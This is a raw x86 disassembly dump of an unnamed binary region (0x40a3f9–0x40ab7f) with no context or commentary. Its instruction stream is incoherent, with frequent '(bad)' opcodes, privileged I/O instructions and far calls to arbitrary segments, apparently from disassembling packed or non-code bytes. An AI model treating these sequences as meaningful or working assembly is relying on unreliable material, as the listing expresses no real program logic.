  40a3f9:	mov    esi,0xf300715b
  40a3fe:	popf   
  40a3ff:	adc    DWORD PTR [edi+esi*1],esp
  40a402:	jmp    DWORD PTR [ecx]
  40a404:	mov    cl,0xb1
  40a406:	ins    DWORD PTR es:[edi],dx
  40a407:	or     esi,DWORD PTR [eax-0x60]
  40a40a:	es pop edx
  40a40c:	sub    al,0x61
  40a40e:	fistp  DWORD PTR [ebx-0x4924e572]
  40a414:	jb     0x40a445
  40a416:	inc    edi
  40a417:	mov    edx,0xf2124f1d
  40a41c:	or     ecx,ebx
  40a41e:	fisttp DWORD PTR [ebp+0xe1f60ce]
  40a424:	mov    edi,0x5ff80010
  40a429:	pop    es
  40a42a:	repnz lea esp,[ebp-0x5ec9bb4a]
  40a431:	or     edi,DWORD PTR [ecx-0x7e8d1224]
  40a437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a438:	lea    edx,[eax+0x531a0c12]
  40a43e:	jb     0x40a44f
  40a440:	call   0x34e6:0xa2dadf2d
  40a447:	jbe    0x40a475
  40a449:	add    al,cl
  40a44b:	leave  
  40a44c:	adc    al,0xdb
  40a44e:	mov    dl,0x41
  40a450:	push   edi
  40a451:	shl    eax,0xcb
  40a454:	sub    bl,al
  40a456:	imul   ebp,DWORD PTR [ebx],0xfffffff2
  40a459:	dec    ebx
  40a45a:	pop    ebx
  40a45b:	mov    ch,0x59
  40a45d:	fucomp st(1)
  40a460:	sub    DWORD PTR [ebx],ecx
  40a462:	outs   dx,BYTE PTR ds:[esi]
  40a463:	add    BYTE PTR [ecx+0x19],bh
  40a466:	ret    0xf5b6
  40a469:	aam    0x15
  40a46b:	daa    
  40a46c:	ret    0x427f
  40a46f:	dec    ebp
  40a470:	or     BYTE PTR [esi+0x56],bl
  40a473:	jmp    0x40a447
  40a475:	ret    0x49b4
  40a478:	xchg   edx,eax
  40a479:	lds    ebp,FWORD PTR [edi+ebx*2+0x2ed179e2]
  40a480:	sub    al,0xff
  40a482:	ins    BYTE PTR es:[edi],dx
  40a483:	pop    edx
  40a484:	add    BYTE PTR [ebx],ch
  40a486:	mov    al,ds:0xca60fd00
  40a48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a48c:	and    dh,BYTE PTR ds:0xb6dbb623
  40a492:	sub    DWORD PTR [edi-0x29c4a911],0x59d9bf80
  40a49c:	(bad)  [esi+0xbe1adc2]
  40a4a2:	(bad)  
  40a4a3:	jg     0x40a4cd
  40a4a5:	fwait
  40a4a6:	pop    eax
  40a4a7:	mov    edi,0x976bd4fb
  40a4ac:	mov    dh,0x76
  40a4ae:	inc    BYTE PTR es:0x48a19ef8
  40a4b5:	aas    
  40a4b6:	mov    edi,0xadc2ad8f
  40a4bb:	jne    0x40a471
  40a4bd:	jo     0x40a511
  40a4bf:	mov    edi,0x1af5b60
  40a4c4:	stos   DWORD PTR es:[edi],eax
  40a4c5:	fnsave [esi+0x21151b8d]
  40a4cb:	pop    edi
  40a4cc:	pop    edx
  40a4cd:	mov    eax,ds:0x9102a53a
  40a4d2:	ins    DWORD PTR es:[edi],dx
  40a4d3:	mov    eax,ds:0x1f7aa17c
  40a4d8:	xor    al,BYTE PTR [eax]
  40a4da:	fnstenv [ecx]
  40a4dc:	pop    esi
  40a4dd:	(bad)  
  40a4de:	sbb    eax,0x8d85b70a
  40a4e3:	and    esp,edi
  40a4e5:	adc    al,0xf4
  40a4e7:	cmp    al,ah
  40a4e9:	xchg   ebp,eax
  40a4ea:	ficom  DWORD PTR [ebx]
  40a4ec:	mov    ds:0x7cb71b6d,al
  40a4f1:	and    dh,BYTE PTR [edx+0x2d]
  40a4f4:	push   es
  40a4f5:	mov    edi,0xb6ed6221
  40a4fa:	mov    cl,0xb5
  40a4fc:	sar    BYTE PTR [edi+0x118621fd],0x20
  40a503:	and    eax,0x6dbe5802
  40a508:	ins    DWORD PTR es:[edi],dx
  40a509:	ret    0xb81f
  40a50c:	push   cs
  40a50d:	in     al,dx
  40a50e:	loop   0x40a53a
  40a510:	add    BYTE PTR [edi+0x21],ah
  40a513:	test   DWORD PTR [ebp+0x5b],ebp
  40a516:	pop    eax
  40a517:	sbb    edi,esi
  40a519:	jns    0x40a4ec
  40a51b:	or     BYTE PTR [ecx+ebp*1-0x65],ah
  40a51f:	sub    ebp,DWORD PTR [si-0x49]
  40a523:	shr    BYTE PTR [esi],cl
  40a525:	and    eax,ebp
  40a527:	cmp    esi,DWORD PTR [ecx+ecx*2+0x591f7832]
  40a52e:	mov    es,WORD PTR [ebp-0x5adf9c93]
  40a534:	jae    0x40a519
  40a536:	in     al,dx
  40a537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a538:	aaa    
  40a539:	or     al,0x6d
  40a53b:	mov    ebx,0x4746db4
  40a540:	pop    edi
  40a541:	stos   DWORD PTR es:[edi],eax
  40a542:	into   
  40a543:	pushf  
  40a544:	push   cs
  40a545:	dec    edx
  40a546:	je     0x40a54d
  40a548:	mov    dh,0x29
  40a54a:	outs   dx,BYTE PTR ds:[esi]
  40a54b:	or     ebx,ecx
  40a54d:	fsub   st(7),st
  40a54f:	add    al,0x3e
  40a551:	scas   eax,DWORD PTR es:[edi]
  40a552:	jle    0x40a595
  40a554:	stos   BYTE PTR es:[edi],al
  40a555:	mov    dh,0x5d
  40a557:	fdiv   DWORD PTR [esi+0x32804e65]
  40a55d:	or     eax,0x2d9579d4
  40a562:	into   
  40a563:	imul   esp,DWORD PTR [ebx-0x7d],0x5edf4ad
  40a56a:	mov    dl,0x6
  40a56c:	hlt    
  40a56d:	aam    0x6b
  40a56f:	(bad)  [esi+0x59aa3f76]
  40a575:	stos   BYTE PTR es:[edi],al
  40a576:	pop    ss
  40a577:	add    eax,0x49475c18
  40a57c:	fnsave [esi-0x26cb9e8a]
  40a582:	pop    es
  40a583:	inc    eax
  40a584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a585:	cmc    
  40a586:	inc    eax
  40a587:	(bad)  
  40a588:	and    al,0xd5
  40a58a:	fcmovnu st,st(2)
  40a58c:	lods   eax,DWORD PTR ds:[esi]
  40a58d:	sub    eax,0xb3cbdc68
  40a592:	mov    al,0x20
  40a594:	gs jno 0x40a5be
  40a597:	cmp    ah,bl
  40a599:	push   ss
  40a59a:	fisub  DWORD PTR [ebp-0x45]
  40a59d:	iret   
  40a59e:	xchg   bl,ah
  40a5a0:	call   0x15b8:0xf4d19e3e
  40a5a7:	outs   dx,DWORD PTR cs:[esi]
  40a5a9:	inc    ebp
  40a5aa:	sub    al,BYTE PTR [eax]
  40a5ac:	inc    ebx
  40a5ad:	add    eax,0x4f954c60
  40a5b2:	out    0xa5,al
  40a5b4:	jbe    0x40a557
  40a5b6:	add    DWORD PTR [eax],esi
  40a5b8:	mov    ds:0x5ffc1a13,eax
  40a5bd:	loopne 0x40a5ff
  40a5bf:	or     esp,ebp
  40a5c1:	fisttp DWORD PTR [eax]
  40a5c3:	rol    BYTE PTR ds:0x6d4a00b0,1
  40a5c9:	add    al,0xa5
  40a5cb:	ss push 0xffffffb7
  40a5ce:	lods   eax,DWORD PTR ds:[esi]
  40a5cf:	cmp    BYTE PTR [ebx],0xd4
  40a5d2:	push   esi
  40a5d3:	push   ss
  40a5d4:	scas   al,BYTE PTR es:[edi]
  40a5d5:	mov    edi,0x5c2a0422
  40a5da:	sub    BYTE PTR [ebx+eiz*2-0x71],bl
  40a5de:	adc    eax,DWORD PTR [edi]
  40a5e0:	out    dx,al
  40a5e1:	add    al,0xac
  40a5e3:	arpl   WORD PTR [ebx+0x68],bx
  40a5e6:	fisttp QWORD PTR [esi-0x2c837abc]
  40a5ec:	and    edi,ebx
  40a5ee:	xchg   ebx,eax
  40a5ef:	adc    bl,dl
  40a5f1:	ret    0x616d
  40a5f4:	mov    esp,0xdcd72f07
  40a5f9:	jbe    0x40a614
  40a5fb:	imul   edi,DWORD PTR [edx-0x5d],0x8816dc2d
  40a602:	imul   BYTE PTR [ecx]
  40a604:	hlt    
  40a605:	(bad)  [esi]
  40a607:	or     DWORD PTR [ebx+0x707ed472],ebx
  40a60d:	arpl   WORD PTR [ecx-0x3a1e0d67],bp
  40a613:	jg     0x40a692
  40a615:	sahf   
  40a616:	sub    al,0xb4
  40a618:	in     eax,dx
  40a619:	mov    dh,0xc5
  40a61b:	rcl    DWORD PTR [ecx],0xe7
  40a61e:	fistp  QWORD PTR [esi]
  40a620:	pop    ebp
  40a621:	push   0x6d6dd9c4
  40a626:	pop    ebx
  40a627:	or     ebp,DWORD PTR [edx]
  40a629:	test   ch,ah
  40a62b:	loop   0x40a607
  40a62d:	xchg   esp,eax
  40a62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a62f:	add    ebp,DWORD PTR [edi]
  40a631:	adc    al,0xb8
  40a633:	mov    al,0x26
  40a635:	addr16 add esi,edx
  40a638:	lea    esp,[edi]
  40a63a:	xchg   edi,eax
  40a63b:	sub    BYTE PTR ds:0x25da1600,0x96
  40a642:	fcom   DWORD PTR [eax+0xbf6e62e]
  40a648:	pop    ds
  40a649:	push   ebx
  40a64a:	test   al,0x76
  40a64c:	pop    ebx
  40a64d:	fisubr DWORD PTR [edx+0x5673d4bb]
  40a653:	jp     0x40a661
  40a655:	adc    DWORD PTR [eax+eax*8+0x1790d6d2],esi
  40a65c:	jne    0x40a5f9
  40a65e:	aaa    
  40a65f:	aad    0x11
  40a661:	sbb    ebx,DWORD PTR [ebx]
  40a663:	ins    DWORD PTR es:[edi],dx
  40a664:	mov    ebx,0xbfd2fa6e
  40a669:	jle    0x40a6d3
  40a66b:	mov    cl,0x60
  40a66d:	stc    
  40a66e:	jnp    0x40a646
  40a670:	inc    edx
  40a671:	fist   DWORD PTR [esi-0x136d1133]
  40a677:	or     esi,ecx
  40a679:	xchg   DWORD PTR [edi],esi
  40a67b:	outs   dx,BYTE PTR ds:[esi]
  40a67c:	dec    ebx
  40a67d:	sbb    ebx,ebx
  40a67f:	xchg   bl,ah
  40a681:	dec    ebx
  40a682:	aas    
  40a683:	std    
  40a684:	cmp    ebp,DWORD PTR [edx+0x34599f02]
  40a68a:	pusha  
  40a68b:	mov    ds:0x27a43523,eax
  40a690:	mov    edi,esp
  40a692:	ins    DWORD PTR es:[edi],dx
  40a693:	or     edi,DWORD PTR [edi]
  40a695:	outs   dx,BYTE PTR ds:[esi]
  40a696:	ss push 0x48fbc3da
  40a69c:	mov    fs,WORD PTR [ecx]
  40a69e:	xchg   ebp,eax
  40a69f:	jl     0x40a6ce
  40a6a1:	mov    ah,0x6d
  40a6a3:	pop    es
  40a6a4:	mov    BYTE PTR [ecx+0x1e],bh
  40a6a7:	add    eax,0xa3016512
  40a6ac:	push   0x29b6ed88
  40a6b1:	call   0xc00722d9
  40a6b6:	inc    ebp
  40a6b7:	lahf   
  40a6b8:	xchg   esi,eax
  40a6b9:	fdiv   QWORD PTR [esi-0x1680a01b]
  40a6bf:	cli    
  40a6c0:	add    BYTE PTR [eax+0x1],dh
  40a6c3:	add    BYTE PTR [ebx+ebx*8-0x1cdc89d4],cl
  40a6ca:	xchg   DWORD PTR [ebp+0x102db5ad],ebp
  40a6d0:	sub    DWORD PTR [esi+0xc0e2e18],esi
  40a6d6:	rol    DWORD PTR ds:0xb9da1637,cl
  40a6dc:	sbb    DWORD PTR ds:0x745a3273,eax
  40a6e2:	mov    dl,0x6f
  40a6e4:	lea    ebx,[ebx+0x3]
  40a6e7:	cmp    al,0x4f
  40a6e9:	lds    esp,FWORD PTR [eax]
  40a6eb:	mov    cl,0x6c
  40a6ed:	out    dx,eax
  40a6ee:	(bad)  
  40a6ef:	bound  eax,QWORD PTR [eax]
  40a6f1:	xchg   esi,eax
  40a6f2:	or     ah,BYTE PTR [ebp+0xb823f2]
  40a6f8:	push   ss
  40a6f9:	pushf  
  40a6fa:	jg     0x40a69d
  40a6fc:	popf   
  40a6fd:	mov    BYTE PTR [ebx+0x13],bl
  40a700:	frstor [ebp-0x18]
  40a703:	dec    ecx
  40a704:	fsub   DWORD PTR [eax+edi*8-0x7a3e24a5]
  40a70b:	ins    DWORD PTR es:[edi],dx
  40a70c:	jmp    0x40a697
  40a70e:	mov    al,ds:0xd42c9abf
  40a713:	popa   
  40a714:	xor    eax,0xd6c2ed71
  40a719:	ss mov esp,0x4dbc7359
  40a71f:	es arpl WORD PTR fs:[esi],sp
  40a723:	pop    esp
  40a724:	mov    bh,0xd0
  40a726:	mov    edx,0x8939206d
  40a72b:	dec    esp
  40a72c:	adc    edi,ebx
  40a72e:	pop    ds
  40a72f:	fdivr  QWORD PTR [ecx+eiz*2-0x7cc9249f]
  40a736:	retf   0x8c20
  40a739:	outs   dx,BYTE PTR gs:[esi]
  40a73b:	inc    eax
  40a73c:	in     al,0xa
  40a73e:	jo     0x40a6eb
  40a740:	je     0x40a7a5
  40a742:	and    al,0x7e
  40a744:	and    dh,BYTE PTR ds:0x36eb7614
  40a74a:	mov    bh,0xd2
  40a74c:	ins    DWORD PTR es:[edi],dx
  40a74d:	stos   DWORD PTR es:[edi],eax
  40a74e:	cmp    ah,BYTE PTR ds:0x8b3fb993
  40a754:	or     ebx,DWORD PTR [edx]
  40a756:	and    BYTE PTR [ebp+eax*4-0x53],0xb6
  40a75b:	cld    
  40a75c:	add    BYTE PTR [ecx],dh
  40a75e:	test   BYTE PTR [eax],0x4a
  40a761:	mov    bl,BYTE PTR [ebp+esi*1+0x70]
  40a765:	add    esi,DWORD PTR [eax-0x57]
  40a768:	fnsave [esi+0x485cc7b6]
  40a76e:	push   0xffffffb8
  40a770:	or     bl,dh
  40a772:	push   ecx
  40a773:	or     eax,DWORD PTR [edi-0x3e]
  40a776:	ret    0x76f2
  40a779:	sbb    al,0xf
  40a77b:	cmp    BYTE PTR [ecx],ah
  40a77d:	add    BYTE PTR [eax+0x6f],ch
  40a780:	(bad)  
  40a782:	aaa    
  40a783:	mov    ebx,0x67ed6d2d
  40a788:	mov    bl,0x6b
  40a78a:	inc    ecx
  40a78b:	adc    eax,0x543b3874
  40a790:	or     DWORD PTR [ebx],0x6d6c2db0
  40a796:	frstor [eax]
  40a798:	jmp    0xa483274c
  40a79d:	inc    eax
  40a79e:	fisubr DWORD PTR [edi+0x37eebb6d]
  40a7a4:	(bad)  
  40a7a5:	cmp    BYTE PTR [ebp+ecx*2+0x38e57fae],bh
  40a7ac:	lds    ecx,FWORD PTR [ebp-0x642297aa]
  40a7b2:	das    
  40a7b3:	push   0x458be897
  40a7b8:	or     ecx,DWORD PTR [ebx+0xb]
  40a7bb:	pop    ebx
  40a7bc:	pop    es
  40a7bd:	fisttp WORD PTR [ecx+0x6d]
  40a7c0:	xor    eax,0xe176f478
  40a7c5:	push   edx
  40a7c6:	(bad)  [esi-0x19c0d12]
  40a7cc:	hlt    
  40a7cd:	adc    eax,0x409f7bd4
  40a7d2:	xchg   esi,eax
  40a7d3:	pop    edx
  40a7d4:	inc    edi
  40a7d5:	ins    DWORD PTR es:[edi],dx
  40a7d6:	popf   
  40a7d7:	dec    ebp
  40a7d8:	fistp  QWORD PTR [ebx+0x475caa1a]
  40a7de:	fld    TBYTE PTR [ebp+0x4077bfdc]
  40a7e4:	(bad)  
  40a7e5:	cmp    BYTE PTR [ebx+ebp*2+0x1b0bdf89],dh
  40a7ec:	fcmovnb st,st(6)
  40a7ee:	mov    bh,0x66
  40a7f0:	mov    BYTE PTR [edi+edx*8-0x6d],al
  40a7f4:	lods   al,BYTE PTR ds:[esi]
  40a7f5:	loop   0x40a7ae
  40a7f7:	lods   eax,DWORD PTR ds:[esi]
  40a7f8:	fnsave [esi+0x290024f2]
  40a7fe:	dec    esi
  40a7ff:	push   eax
  40a800:	mov    ds:0x710a1c95,eax
  40a805:	mov    DWORD PTR [eax+0x6a],ebx
  40a808:	(bad)  [ebp-0x1b9bee52]
  40a80e:	mov    al,0x59
  40a810:	sbb    eax,0xdb760be3
  40a815:	push   0x32c3ab17
  40a81a:	ds push es
  40a81c:	mov    ah,0x6f
  40a81e:	mov    cl,0xf7
  40a820:	jecxz  0x40a805
  40a822:	push   esi
  40a823:	mov    al,ds:0x7df7c1ad
  40a828:	aam    0x12
  40a82a:	popa   
  40a82b:	push   es
  40a82c:	ret    0xd2c6
  40a82f:	inc    esi
  40a830:	scas   al,BYTE PTR es:[edi]
  40a831:	div    dl
  40a833:	cld    
  40a834:	lahf   
  40a835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a836:	push   ebp
  40a837:	push   ss
  40a838:	mov    dh,0x5b
  40a83a:	loope  0x40a84c
  40a83c:	sbb    eax,0x6e240249
  40a841:	repnz nop
  40a843:	jg     0x40a7f3
  40a845:	xor    al,0xb6
  40a847:	fist   DWORD PTR [esi-0x80]
  40a84a:	dec    ebx
  40a84b:	mov    bl,0xd4
  40a84d:	lods   eax,DWORD PTR ds:[esi]
  40a84e:	xchg   ebp,eax
  40a84f:	pop    es
  40a850:	mov    ds:0x2edb42e8,al
  40a855:	xor    esi,esp
  40a857:	mov    ebp,0xc70e015c
  40a85c:	jb     0x40a826
  40a85e:	pop    ebp
  40a85f:	push   0xaceaaa6c
  40a864:	repz dec eax
  40a866:	mov    eax,0xb1b86617
  40a86b:	icebp  
  40a86c:	mov    al,0x9b
  40a86e:	frstor [eax+0x3f1bf0e0]
  40a874:	test   al,0x9e
  40a876:	mov    al,0x5d
  40a878:	push   0xd5aab89f
  40a87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a87e:	test   DWORD PTR [ebp-0x4f98faf3],ebp
  40a884:	adc    eax,0x1207b43e
  40a889:	dec    edx
  40a88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a88b:	lock ins DWORD PTR es:[edi],dx
  40a88d:	sahf   
  40a88e:	xor    BYTE PTR [ecx+0x3c1b4fb5],dh
  40a894:	dec    esi
  40a895:	mov    edi,0x5080381c
  40a89a:	xchg   DWORD PTR [eax-0x4593d2d3],esi
  40a8a0:	or     DWORD PTR ds:0x7db3688c,ecx
  40a8a6:	and    al,0x1a
  40a8a8:	shl    DWORD PTR [esi+0x774ceeb4],0x4a
  40a8af:	idiv   DWORD PTR [esi+0x79]
  40a8b2:	mov    bh,0xc8
  40a8b4:	inc    ecx
  40a8b5:	fcom   QWORD PTR [esi-0x40]
  40a8b8:	lock pop ebp
  40a8ba:	and    BYTE PTR [edi-0x66],ch
  40a8bd:	xor    eax,0xc56b7e50
  40a8c2:	or     bh,bl
  40a8c4:	dec    ebp
  40a8c5:	add    BYTE PTR [esi-0x596f03c4],bl
  40a8cb:	pusha  
  40a8cc:	popa   
  40a8cd:	add    eax,DWORD PTR [esi+0x861d1f3]
  40a8d3:	xchg   ebx,eax
  40a8d4:	sbb    edx,DWORD PTR [edi+0x78ff8dda]
  40a8da:	mov    esi,0x222341fe
  40a8df:	mov    ds:0x2b562290,eax
  40a8e4:	push   0xae347a6c
  40a8e9:	sub    al,0x9d
  40a8eb:	outs   dx,BYTE PTR ss:[esi]
  40a8ed:	sbb    ecx,ebx
  40a8ef:	test   DWORD PTR [edx],edx
  40a8f1:	sysexit 
  40a8f3:	jge    0x40a8e9
  40a8f5:	inc    edx
  40a8f6:	sub    eax,0x56b6dbb9
  40a8fb:	mov    ch,0x3d
  40a8fd:	add    al,0x2c
  40a8ff:	inc    ebp
  40a900:	mov    esp,0x6ddb9be0
  40a905:	arpl   WORD PTR [ebx+0x19],sp
  40a908:	and    al,0xba
  40a90a:	dec    eax
  40a90b:	and    eax,0xd7248d83
  40a910:	sbb    BYTE PTR [esi-0x1093f435],dh
  40a916:	push   ds
  40a917:	test   al,0xb2
  40a919:	add    BYTE PTR [ecx],ch
  40a91b:	in     eax,0xb6
  40a91d:	xchg   edx,eax
  40a91e:	dec    esp
  40a91f:	jmp    0x18125dda
  40a924:	loope  0x40a93a
  40a926:	pop    ss
  40a927:	pop    esi
  40a928:	mov    edi,0x23e9bf71
  40a92d:	outs   dx,BYTE PTR ds:[esi]
  40a92e:	sbb    ebx,DWORD PTR [ebx-0x71]
  40a931:	(bad)  
  40a933:	and    BYTE PTR [ebx],0x76
  40a936:	and    esp,DWORD PTR [ebx]
  40a938:	mov    dh,0x6d
  40a93a:	imul   ebp,DWORD PTR [ecx+0x1701aa21],0x44df773c
  40a944:	mov    BYTE PTR [ebx+0x61],ah
  40a947:	pop    ebx
  40a948:	fcom   DWORD PTR [ebp+0xe5f5e6d]
  40a94e:	call   0x6db6:0x17270c0a
  40a955:	arpl   WORD PTR [edi],di
  40a957:	add    ebp,DWORD PTR [ecx+0x66268c68]
  40a95d:	mul    DWORD PTR [ebp+0x36170a03]
  40a963:	or     cl,BYTE PTR [edi-0x5b]
  40a966:	pop    ebx
  40a967:	mov    esi,0xb17346cb
  40a96c:	loopne 0x40a9d8
  40a96e:	aaa    
  40a96f:	push   edi
  40a970:	xchg   BYTE PTR [esi-0x1a],ah
  40a973:	xchg   esp,eax
  40a974:	ins    DWORD PTR es:[edi],dx
  40a975:	repnz aad 0xb8
  40a978:	sub    eax,0x7ae91eb4
  40a97d:	lock xchg edx,eax
  40a97f:	mov    ebx,0x2817664b
  40a984:	mov    edi,0x59c9242d
  40a989:	test   BYTE PTR [ebx+0x5ab9c000],ah
  40a98f:	cmc    
  40a990:	pop    ds
  40a991:	mov    eax,ds:0x70a176d
  40a996:	mov    eax,0x149ef152
  40a99b:	mov    al,0xd6
  40a99d:	or     ebx,ebx
  40a99f:	test   DWORD PTR [esi+0x13],esi
  40a9a2:	mov    WORD PTR [ebp+eiz*1+0x44],?
  40a9a6:	xor    BYTE PTR ds:0xb6f9b8a1,0xc1
  40a9ad:	(bad)  
  40a9ae:	add    DWORD PTR [ecx+0xbbe02ec],ebx
  40a9b4:	les    ebp,FWORD PTR [esi+0x6c]
  40a9b7:	ins    DWORD PTR es:[edi],dx
  40a9b8:	in     eax,dx
  40a9b9:	ret    0xcd03
  40a9bc:	pop    ebp
  40a9bd:	jbe    0x40a97e
  40a9bf:	sbb    dh,al
  40a9c1:	mov    edi,DWORD PTR [esi]
  40a9c3:	cs adc eax,0x782d6c6e
  40a9c9:	aad    0x41
  40a9cb:	stos   DWORD PTR es:[edi],eax
  40a9cc:	xchg   ecx,eax
  40a9cd:	inc    ecx
  40a9ce:	dec    esi
  40a9cf:	iret   
  40a9d0:	inc    edx
  40a9d1:	mov    ebx,0x2ef1b56d
  40a9d6:	pop    edx
  40a9d7:	dec    bl
  40a9d9:	sub    eax,0xb42ccd41
  40a9de:	in     eax,dx
  40a9df:	mov    BYTE PTR [edx-0x10],0xe
  40a9e3:	repnz push eax
  40a9e5:	xchg   ebx,eax
  40a9e6:	(bad)  
  40a9e9:	mov    dh,0xb0
  40a9eb:	mov    cl,0x6d
  40a9ed:	and    al,0x9f
  40a9ef:	sub    al,0x3a
  40a9f1:	xor    BYTE PTR [esi-0x1f16b4ab],ch
  40a9f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9f8:	in     eax,dx
  40a9f9:	(bad)  
  40a9fa:	mov    ebp,0xc50c2b43
  40a9ff:	sub    BYTE PTR [esi+0x43],ch
  40aa02:	add    bh,ch
  40aa04:	outs   dx,BYTE PTR ds:[esi]
  40aa05:	in     eax,dx
  40aa06:	ret    0xc966
  40aa09:	sub    al,0x95
  40aa0b:	or     eax,0xc2fe3eac
  40aa10:	jg     0x40aa8c
  40aa12:	push   eax
  40aa13:	mov    bh,0xe
  40aa15:	fisub  DWORD PTR [ebx]
  40aa17:	xor    al,0x6a
  40aa19:	dec    edx
  40aa1a:	outs   dx,BYTE PTR ds:[esi]
  40aa1b:	jns    0x40aa26
  40aa1d:	mov    eax,0x174345b1
  40aa22:	icebp  
  40aa23:	pop    edx
  40aa24:	mov    eax,ebx
  40aa26:	dec    esp
  40aa27:	cmp    esi,DWORD PTR [esi+0x156ed6e]
  40aa2d:	mov    al,0xd3
  40aa2f:	xor    ch,BYTE PTR [edi+edx*8]
  40aa32:	fild   DWORD PTR [eax-0x9]
  40aa35:	add    al,0xdb
  40aa37:	mov    dh,0x8d
  40aa39:	jp     0x40aa21
  40aa3b:	js     0x40aa1e
  40aa3d:	dec    edx
  40aa3e:	scas   al,BYTE PTR es:[edi]
  40aa3f:	xchg   ah,dh
  40aa41:	cmc    
  40aa42:	(bad)  
  40aa43:	pusha  
  40aa44:	imul   esp,DWORD PTR [ecx+0x70],0x10
  40aa48:	retf   0x5319
  40aa4b:	ret    0x6ca4
  40aa4e:	ins    BYTE PTR es:[edi],dx
  40aa4f:	in     eax,dx
  40aa50:	(bad)  
  40aa51:	xor    BYTE PTR cs:[ebp+0x4c],cl
  40aa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa56:	ds jo  0x40aa65
  40aa59:	ins    BYTE PTR es:[edi],dx
  40aa5a:	fidiv  DWORD PTR ss:[esi+0x56547410]
  40aa61:	fsub   QWORD PTR [edx+0x51]
  40aa64:	es ins DWORD PTR es:[edi],dx
  40aa66:	arpl   WORD PTR [ecx-0x25],sp
  40aa69:	je     0x40aac5
  40aa6b:	mov    dh,0x5a
  40aa6d:	mov    esi,0x71222154
  40aa72:	in     eax,dx
  40aa73:	push   edx
  40aa74:	mov    eax,ds:0xefba028b
  40aa79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa7a:	mov    dh,0x93
  40aa7c:	and    al,0x2f
  40aa7e:	or     esi,DWORD PTR [ebx+ecx*2+0x621ec08d]
  40aa85:	cld    
  40aa86:	cdq    
  40aa87:	jmp    0x2d6d8be0
  40aa8c:	mov    ah,0xb
  40aa8e:	sbb    al,0x58
  40aa90:	loopne 0x40ab09
  40aa92:	sub    BYTE PTR [edx-0x47279fb9],al
  40aa98:	ins    DWORD PTR es:[edi],dx
  40aa99:	sub    al,0x37
  40aa9b:	adc    ebx,DWORD PTR [edx+0x73]
  40aa9e:	mov    esp,0x70c644a7
  40aaa3:	sbb    ecx,DWORD PTR [ebx]
  40aaa5:	retf   
  40aaa6:	pop    edi
  40aaa7:	jg     0x40aab0
  40aaa9:	add    BYTE PTR [esi+0x41],dl
  40aaac:	add    bh,bl
  40aaae:	repz pop ds
  40aab0:	in     al,dx
  40aab1:	lock bound ebp,QWORD PTR [eax+0x20]
  40aab5:	outs   dx,BYTE PTR ds:[esi]
  40aab6:	mov    ah,0x9d
  40aab8:	inc    edi
  40aab9:	cs call 0x5a5b:0x6d58afed
  40aac1:	pop    edx
  40aac2:	xchg   ecx,eax
  40aac3:	repnz out dx,eax
  40aac5:	into   
  40aac6:	xchg   edx,eax
  40aac7:	gs cwde 
  40aac9:	daa    
  40aaca:	pop    ss
  40aacb:	jbe    0x40aaa8
  40aacd:	mov    dh,0xda
  40aacf:	(bad)  
  40aad0:	vdivpd xmm7,xmm5,XMMWORD PTR [esi-0x64a08ef5]
  40aad8:	sar    DWORD PTR [ebx],1
  40aada:	ret    0x616d
  40aadd:	mov    DWORD PTR [ecx-0x26],ecx
  40aae0:	fistp  WORD PTR [eax+ebp*2+0x22]
  40aae4:	cmp    BYTE PTR [edx],0x1b
  40aae7:	dec    ebx
  40aae8:	retf   
  40aae9:	ret    0x7f93
  40aaec:	mov    cl,0x13
  40aaee:	inc    edi
  40aaef:	and    eax,0xd85bff99
  40aaf4:	adc    al,0x6c
  40aaf6:	cmp    BYTE PTR [ecx],bh
  40aaf8:	cmp    DWORD PTR [edi-0x314a4d88],ebp
  40aafe:	or     ebx,DWORD PTR [ebx]
  40ab00:	mov    ah,0x6d
  40ab02:	daa    
  40ab03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab04:	pop    edx
  40ab05:	(bad)
  40ab08:	ror    cl,1
  40ab0a:	push   edx
  40ab0b:	mov    ebx,0xabd76db1
  40ab10:	push   eax
  40ab11:	xor    BYTE PTR [eax],0xde
  40ab14:	pushf  
  40ab15:	inc    edi
  40ab16:	stos   BYTE PTR es:[edi],al
  40ab17:	imul   ebx,edx,0xffffffbe
  40ab1a:	(bad)  [esi]
  40ab1c:	outs   dx,BYTE PTR ds:[esi]
  40ab1d:	sti    
  40ab1e:	pop    esi
  40ab1f:	into   
  40ab20:	push   ss
  40ab21:	xor    ah,BYTE PTR [ebx-0x13114c5]
  40ab27:	ins    DWORD PTR es:[edi],dx
  40ab28:	arpl   WORD PTR [ecx+0x32],di
  40ab2b:	add    BYTE PTR [ecx+eiz*1+0x118fc227],ch
  40ab32:	hlt    
  40ab33:	add    BYTE PTR [ebx+eiz*2],ah
  40ab36:	add    BYTE PTR [ecx-0x3e],dl
  40ab39:	ins    DWORD PTR es:[edi],dx
  40ab3a:	fistp  DWORD PTR [eax-0x64]
  40ab3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab3e:	sub    DWORD PTR [eax+0x4f83cec1],esi
  40ab44:	dec    ecx
  40ab45:	pop    ebx
  40ab46:	sbb    eax,0x69218dc1
  40ab4b:	imul   ebx,DWORD PTR [edi],0xdad2a075
  40ab51:	mov    eax,0xaa924b6d
  40ab56:	dec    edx
  40ab57:	nop
  40ab58:	aam    0x6b
  40ab5a:	cmp    al,dh
  40ab5c:	jecxz  0x40abcb
  40ab5e:	mov    ecx,0x130255b4
  40ab63:	mov    ebp,0xe624e983
  40ab68:	push   ebx
  40ab69:	mov    al,0x15
  40ab6b:	cs mov ah,0x7c
  40ab6e:	and    edx,DWORD PTR [eax]
  40ab70:	mov    ds:0x35ddd0d7,al
  40ab75:	ins    DWORD PTR es:[edi],dx
  40ab76:	ins    BYTE PTR es:[edi],dx
  40ab77:	(bad)  [esi-0x1df1e76c]
  40ab7d:	adc    al,0xa8
  40ab7f:	pop    ecx
